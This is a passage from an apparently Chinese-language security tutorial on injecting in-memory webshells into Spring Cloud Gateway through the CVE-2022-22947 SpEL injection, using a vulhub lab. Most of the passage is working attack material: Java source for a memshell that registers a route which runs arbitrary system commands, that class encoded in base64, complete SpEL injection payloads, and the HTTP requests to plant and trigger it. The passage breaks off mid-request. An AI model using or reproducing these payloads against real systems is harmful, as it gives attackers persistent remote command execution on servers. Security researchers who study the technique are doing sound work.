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\u0026#39;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}\u0026#34;, \u0026#34;_genkey_1\u0026#34;: \u0026#34;/${path}\u0026#34; } } ], \u0026#34;uri\u0026#34;: \u0026#34;https://xvshifu.github.io/\u0026#34;, \u0026#34;order\u0026#34;: 0 } 刷新路由：\nplain\r1 2 3 4 5 POST /actuator/gateway/refresh HTTP/1.1 Host: 192.168.31.16:8080 Content-Type: application/json Connection: close Content-Length: 258 查看添加的路由：\nplain\r1 2 3 GET /actuator/gateway/routes HTTP/1.1 Host: 192.168.31.16:8080 Connection: close 测试注入成功：\nplain\r1 2 3 4 5 6 POST /actuator/gateway/memshell/test HTTP/1.1 Host: 192.168.31.16:8080 Content-Type: application/json Connection: close X-CMD: whoami Content-Length: 0 记得删除：\njava\r1 2 3 DELETE /actuator/gateway/routes/memshell HTTP/1.1 Host: 192.168.31.16:8080 Content-Type: application/json 3.3 Spring 层内存马 3.3.1 思路 Spring 层 request 请求处理组件很多，有 handler/Adapter/Filter 等等，理论上都可以拿来做内存马，这里我分享下最简单的 RequestMappingHandler。\nSpring cloud gateway主要的路由分发主要由org.springframework.web.reactive.DispatcherHandler类和它三个组件来完成\n\\1. org.springframework.web.reactive.HandlerMapping 路由比配器\n\\2. org.springframework.web.reactive.HandlerAdapter handler适配器\n\\3. org.springframework.web.reactive.HandlerResultHandler 结果处理器\n源码路径：\ntext\r1 org\\springframework\\spring-webflux\\5.2.15.RELEASE\\spring-webflux-5.2.15.RELEASE-sources.jar!\\org\\springframework\\web\\reactive\\DispatcherHandler.java java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 @Override //Spring WebFlux 中 统一入口点，每当有 HTTP 请求进来，DispatcherHandler 就会调用该方法进行处理。 //ServerWebExchange 包含请求和响应的所有内容 public Mono\u0026lt;Void\u0026gt; handle(ServerWebExchange exchange) { //判断是否存在 HandlerMapping if (this.handlerMappings == null) { return createNotFoundError(); } //将所有 HandlerMapping 转换为 Flux return Flux.fromIterable(this.handlerMappings) //对每个 HandlerMapping 执行：mapping.getHandler(exchange) //匹配请求，找到对应处理器 handler .concatMap(mapping -\u0026gt; mapping.getHandler(exchange)) //Flux 中可能返回多个（理论上），但只需要第一个匹配的 handler .next() //如果上面的 .next() 没有找到匹配的 handler，这里返回 404。 .switchIfEmpty(createNotFoundError()) //找到 handler 以后，并非直接执行它，而是交给 HandlerAdapter .flatMap(handler -\u0026gt; invokeHandler(exchange, handler)) //将 handler 执行结果写入响应 .flatMap(result -\u0026gt; handleResult(exchange, result)); } 根据这个流程，我们找出一个构造内存马的思路，让 HandlerMapping 注册一个映射关系，通过映射关系让特定的 HandlerAdapter 执行到内存马流程，最后内存马返回一个 HandlerResultHandler 可以处理的结果类型即可。\n沿用 @c0ny1 师傅选择的类：RequestMappingHandlerMapping\n3.3.2 内存马： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import org.springframework.http.HttpStatus; import org.springframework.http.ResponseEntity; import org.springframework.web.reactive.result.condition.PatternsRequestCondition; import org.springframework.web.reactive.result.method.RequestMappingInfo; import org.springframework.web.util.pattern.PathPattern; import org.springframework.web.util.pattern.PathPatternParser; import java.io.IOException; import java.lang.reflect.Method; import java.util.Scanner; public class SpringRequestMappingMemshell { public static String doInject(Object requestMappingHandlerMapping) { String msg = \u0026#34;inject-start\u0026#34;; try { Method registerHandlerMethod = requestMappingHandlerMapping.getClass().getDeclaredMethod(\u0026#34;registerHandlerMethod\u0026#34;, Object.class, Method.class, RequestMappingInfo.class); registerHandlerMethod.setAccessible(true); Method executeCommand = SpringRequestMappingMemshell.class.getDeclaredMethod(\u0026#34;executeCommand\u0026#34;, String.class); PathPattern pathPattern = new PathPatternParser().parse(\u0026#34;/*\u0026#34;); PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition(pathPattern); RequestMappingInfo requestMappingInfo = new RequestMappingInfo(\u0026#34;\u0026#34;, patternsRequestCondition, null, null, null, null, null, null); registerHandlerMethod.invoke(requestMappingHandlerMapping, new SpringRequestMappingMemshell(), executeCommand, requestMappingInfo); msg = \u0026#34;inject-success\u0026#34;; }catch (Exception e){ msg = \u0026#34;inject-error\u0026#34;; } return msg; } public ResponseEntity executeCommand(String cmd) throws IOException { String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;).next(); return new ResponseEntity(execResult, HttpStatus.OK); } } 分析：\n该内存马动态往 Spring 的 RequestMappingHandlerMapping 注册一个新的 URL 映射（Mapping），并绑定到 executeCommand() 方法。\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public class SpringRequestMappingMemshell { //注入入口，参数：Spring 的 RequestMappingHandlerMapping 实例 public static String doInject(Object requestMappingHandlerMapping) { String msg = \u0026#34;inject-start\u0026#34;; try { //获取 registerHandlerMethod 反射方法 //绕过 Spring 注解体系，使用反射直接注册一个新的处理器方法。 Method registerHandlerMethod = requestMappingHandlerMapping.getClass().getDeclaredMethod(\u0026#34;registerHandlerMethod\u0026#34;, Object.class, Method.class, RequestMappingInfo.class); registerHandlerMethod.setAccessible(true); //获取统一处理器方法 executeCommand Method executeCommand = SpringRequestMappingMemshell.class.getDeclaredMethod(\u0026#34;executeCommand\u0026#34;, String.class); //构造 RequestMappingInfo PathPattern pathPattern = new PathPatternParser().parse(\u0026#34;/*\u0026#34;); PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition(pathPattern); RequestMappingInfo requestMappingInfo = new RequestMappingInfo(\u0026#34;\u0026#34;, patternsRequestCondition, null, null, null, null, null, null); //正式注入 registerHandlerMethod.invoke(requestMappingHandlerMapping, new SpringRequestMappingMemshell(), executeCommand, requestMappingInfo); //返回注入结果 msg = \u0026#34;inject-success\u0026#34;; }catch (Exception e){ msg = \u0026#34;inject-error\u0026#34;; } return msg; } //获取 cmd 参数，Runtime.getRuntime().exec(cmd) 执行系统命令 //使用 Scanner 将结果读取为字符串 //Spring MVC 返回文本 — ResponseEntity public ResponseEntity executeCommand(String cmd) throws IOException { String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;).next(); return new ResponseEntity(execResult, HttpStatus.OK); } } 3.3.3 尝试攻击 原始 payload：\njava\r1 #{T(org.springframework.cglib.core.ReflectUtils).defineClass(\u0026#39;Memshell\u0026#39;,T(org.springframework.util.Base64Utils).decodeFromString(\u0026#39;yv66vgAAA....\u0026#39;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()} 那怎么获取到RequestMappingHandlerMapping呢？通过java-object-searcher自然可以定位到，小组的@whw1sfb师傅提到了一种更简便的方案，从SPEL上下文的bean当中获取\n构造 payload：\njava\r1 #{T(org.springframework.cglib.core.ReflectUtils).defineClass(\u0026#39;SpringRequestMappingMemshell\u0026#39;,T(org.springframework.util.Base64Utils).decodeFromString(\u0026#39;yv66vgAAA....\u0026#39;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(RequestMappingHandlerMapping)} SpringRequestMappingMemshell.java -\u0026gt; SpringRequestMappingMemshell.class -\u0026gt; Base64:\njava\r1 yv66vgAAADQAiwoABgBICABJCgAGAEoIADAHAEsHAEwHAE0HAE4KAAUATwoABwBQBwBRCAAyBwBSBwBTCgAOAEgIAFQKAA4AVQcAVgcAVwoAEgBYCABZCgAIAFoKAAsASAoABwBbCABcBwBdCABeBwBfCgBgAGEKAGAAYgoAYwBkCgAcAGUIAGYKABwAZwoAHABoBwBpCQBqAGsKACQAbAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFXJlZ2lzdGVySGFuZGxlck1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBAAtwYXRoUGF0dGVybgEAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm47AQAYcGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uAQBMTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAccmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA21zZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUBABBNZXRob2RQYXJhbWV0ZXJzAQA9KExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5OwEAA2NtZAEACmV4ZWNSZXN1bHQBAApFeGNlcHRpb25zBwBtAQAKU291cmNlRmlsZQEAIVNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGwuamF2YQwAJwAoAQAMaW5qZWN0LXN0YXJ0DABuAG8BAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MAHAAcQwAcgBzAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcBADZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXIBAAIvKgwAdAB1AQBKb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BADBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm4MACcAdgEAAAwAJwB3DAB4AHkBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IBABFqYXZhL3V0aWwvU2Nhbm5lcgcAegwAewB8DAB9AH4HAH8MAIAAgQwAJwCCAQACXEEMAIMAhAwAhQCGAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwCHDACIAIkMACcAigEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEABXBhcnNlAQBGKExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvdXRpbC9wYXR0ZXJuL1BhdGhQYXR0ZXJuOwEANihbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3V0aWwvcGF0dGVybi9QYXRoUGF0dGVybjspVgECJChMamF2YS9sYW5nL1N0cmluZztMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgAhAAsABgAAAAAAAwABACcAKAABACkAAAAvAAEAAQAAAAUqtwABsQAAAAIAKgAAAAYAAQAAAAwAKwAAAAwAAQAAAAUALAAtAAAACQAuAC8AAgApAAABUwAKAAcAAACSEgJMKrYAAxIEBr0ABVkDEgZTWQQSB1NZBRIIU7YACU0sBLYAChILEgwEvQAFWQMSDVO2AAlOuwAOWbcADxIQtgAROgS7ABJZBL0AE1kDGQRTtwAUOgW7AAhZEhUZBQEBAQEBAbcAFjoGLCoGvQAGWQO7AAtZtwAXU1kELVNZBRkGU7YAGFcSGUynAAdNEhtMK7AAAQADAIkAjAAaAAMAKgAAADYADQAAAA4AAwAQACAAEQAlABIANgATAEQAFABWABUAaQAWAIYAFwCJABoAjAAYAI0AGQCQABsAKwAAAFIACAAgAGkAMAAxAAIANgBTADIAMQADAEQARQAzADQABABWADMANQA2AAUAaQAgADcAOAAGAI0AAwA5ADoAAgAAAJIAOwA8AAAAAwCPAD0APgABAD8AAAATAAL/AIwAAgcABgcADQABBwAaAwBAAAAABQEAOwAAAAEAMgBBAAMAKQAAAGgABAADAAAAJrsAHFm4AB0rtgAetgAftwAgEiG2ACK2ACNNuwAkWSyyACW3ACawAAAAAgAqAAAACgACAAAAHwAaACAAKwAAACAAAwAAACYALAAtAAAAAAAmAEIAPgABABoADABDAD4AAgBEAAAABAABAEUAQAAAAAUBAEIAAAABAEYAAAACAEc= 完整的 payload：\njava\r1 #{T(org.springframework.cglib.core.ReflectUtils).defineClass(\u0026#39;SpringRequestMappingMemshell\u0026#39;,T(org.springframework.util.Base64Utils).decodeFromString(\u0026#39;yv66vgAAADQAiwoABgBICABJCgAGAEoIADAHAEsHAEwHAE0HAE4KAAUATwoABwBQBwBRCAAyBwBSBwBTCgAOAEgIAFQKAA4AVQcAVgcAVwoAEgBYCABZCgAIAFoKAAsASAoABwBbCABcBwBdCABeBwBfCgBgAGEKAGAAYgoAYwBkCgAcAGUIAGYKABwAZwoAHABoBwBpCQBqAGsKACQAbAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFXJlZ2lzdGVySGFuZGxlck1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBAAtwYXRoUGF0dGVybgEAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm47AQAYcGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uAQBMTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAccmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA21zZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUBABBNZXRob2RQYXJhbWV0ZXJzAQA9KExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5OwEAA2NtZAEACmV4ZWNSZXN1bHQBAApFeGNlcHRpb25zBwBtAQAKU291cmNlRmlsZQEAIVNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGwuamF2YQwAJwAoAQAMaW5qZWN0LXN0YXJ0DABuAG8BAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MAHAAcQwAcgBzAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcBADZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXIBAAIvKgwAdAB1AQBKb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BADBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm4MACcAdgEAAAwAJwB3DAB4AHkBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IBABFqYXZhL3V0aWwvU2Nhbm5lcgcAegwAewB8DAB9AH4HAH8MAIAAgQwAJwCCAQACXEEMAIMAhAwAhQCGAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwCHDACIAIkMACcAigEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEABXBhcnNlAQBGKExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvdXRpbC9wYXR0ZXJuL1BhdGhQYXR0ZXJuOwEANihbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3V0aWwvcGF0dGVybi9QYXRoUGF0dGVybjspVgECJChMamF2YS9sYW5nL1N0cmluZztMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgAhAAsABgAAAAAAAwABACcAKAABACkAAAAvAAEAAQAAAAUqtwABsQAAAAIAKgAAAAYAAQAAAAwAKwAAAAwAAQAAAAUALAAtAAAACQAuAC8AAgApAAABUwAKAAcAAACSEgJMKrYAAxIEBr0ABVkDEgZTWQQSB1NZBRIIU7YACU0sBLYAChILEgwEvQAFWQMSDVO2AAlOuwAOWbcADxIQtgAROgS7ABJZBL0AE1kDGQRTtwAUOgW7AAhZEhUZBQEBAQEBAbcAFjoGLCoGvQAGWQO7AAtZtwAXU1kELVNZBRkGU7YAGFcSGUynAAdNEhtMK7AAAQADAIkAjAAaAAMAKgAAADYADQAAAA4AAwAQACAAEQAlABIANgATAEQAFABWABUAaQAWAIYAFwCJABoAjAAYAI0AGQCQABsAKwAAAFIACAAgAGkAMAAxAAIANgBTADIAMQADAEQARQAzADQABABWADMANQA2AAUAaQAgADcAOAAGAI0AAwA5ADoAAgAAAJIAOwA8AAAAAwCPAD0APgABAD8AAAATAAL/AIwAAgcABgcADQABBwAaAwBAAAAABQEAOwAAAAEAMgBBAAMAKQAAAGgABAADAAAAJrsAHFm4AB0rtgAetgAftwAgEiG2ACK2ACNNuwAkWSyyACW3ACawAAAAAgAqAAAACgACAAAAHwAaACAAKwAAACAAAwAAACYALAAtAAAAAAAmAEIAPgABABoADABDAD4AAgBEAAAABAABAEUAQAAAAAUBAEIAAAABAEYAAAACAEc=\u0026#39;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(RequestMappingHandlerMapping)} 使用 vulhub/spring/CVE-2022-22947 环境\nplain\r1 docker compose up -d 传入内存马：\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 POST /actuator/gateway/routes/springmemshell HTTP/1.1 Host: 192.168.31.16:8080 Content-Type: application/json { \u0026#34;predicates\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Path\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;/springmemshell/**\u0026#34; } } ], 